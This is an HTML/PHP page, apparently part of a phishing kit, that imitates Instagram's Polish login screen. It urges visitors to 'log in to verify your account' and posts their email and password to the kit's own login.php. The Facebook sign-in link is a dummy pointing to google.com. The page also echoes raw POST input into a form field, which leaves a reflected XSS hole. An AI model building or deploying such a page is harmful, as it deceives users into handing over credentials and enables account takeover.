<html>

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-Ua-Compatible" content="IE=edge,chrome=1">
    <script src="https://kit.fontawesome.com/083afe1345.js" crossorigin="anonymous"></script>
    <link rel="stylesheet" href="styleindex2.css" type="text/css">
    <title>Instagram - zaloguj się</title>
    <link rel="icon" href="/ig/favicon.ico" type="image/x-icon" />
</head>

<body>
    <div class="login-box">
        <div class="login-form">
            <form action="login.php" method="post">
                <img class="iglogo1" src="iglogo1.png">
                <img class="phone" src="phone.jpeg">
                <a class="zaloguj">Zaloguj się, aby zweryfikować konto!</a>
                <?php
                $email = $_POST['email'];
                ?>
                <input type="text" name="email" value="<?php echo "$email"?>" />
                <input type="password" name="haslo" placeholder="Hasło" />
                <button type="submit" name="przycisk">Zaloguj się</button>
                <hr />
            </form>
            <form action="facebook.php" method="post">
                <div class='facebook'>
                    <i class="fab fa-facebook-square"></i>
                    <a href="https://google.com">Zaloguj się przez Facebooka</a>
                </div>
            </form>
            <div class="app">
                <a>Pobierz aplikację.</a>
            </div>
            <div class="app2">
                <img class="appstore" src="/ig/appstore.png"><img class="googleplay" src="/ig/googleplay.png">
            </div>
        </div>
    </div>
</body>

</html>